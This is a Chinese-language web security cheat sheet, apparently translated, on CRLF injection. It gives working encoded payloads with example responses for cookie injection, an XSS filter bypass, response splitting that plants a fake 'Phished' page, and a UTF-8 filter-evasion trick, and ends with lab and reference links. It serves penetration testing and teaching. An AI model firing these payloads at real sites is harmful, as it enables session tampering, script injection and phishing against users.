## CRLF

> CRLF（Carriage Return Line Feed）指的是回车（ASCII 13，\r）换行（ASCII 10，\n）。它们用来表示一行的结束，但在当今流行的操作系统中处理方式不同。例如：在Windows系统中，需要CR和LF来表示一行的结束，而在Linux/UNIX系统中，只需要LF。在HTTP协议中，总是使用CR-LF序列来终止一行。

> 当用户设法在应用程序中提交CRLF时，就会发生CRLF注入攻击。这通常是通过修改HTTP参数或URL来完成的。

## 摘要

- CRLF - 添加cookie
- CRLF - 添加cookie - XSS绕过
- CRLF - 写入HTML
- CRLF - 过滤绕过
- 实验室
- 参考资料

## CRLF - 添加cookie

请求页面

```http
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

HTTP响应

```http
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```

## CRLF - 添加cookie - XSS绕过

请求页面

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

请求响应

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## CRLF - 写HTML

请求URL

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

请求响应

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

## CRLF - 绕过过滤

使用 UTF-8 encoding

```http
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

转换列表:

* %E5%98%8A = %0A = \u560a
* %E5%98%8D = %0D = \u560d
* %E5%98%BE = %3E = \u563e (>)
* %E5%98%BC = %3C = \u563c (<)


## 实验室

* [https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)


## 参考链接

* https://www.owasp.org/index.php/CRLF_Injection
* https://vulners.com/hackerone/H1:192749
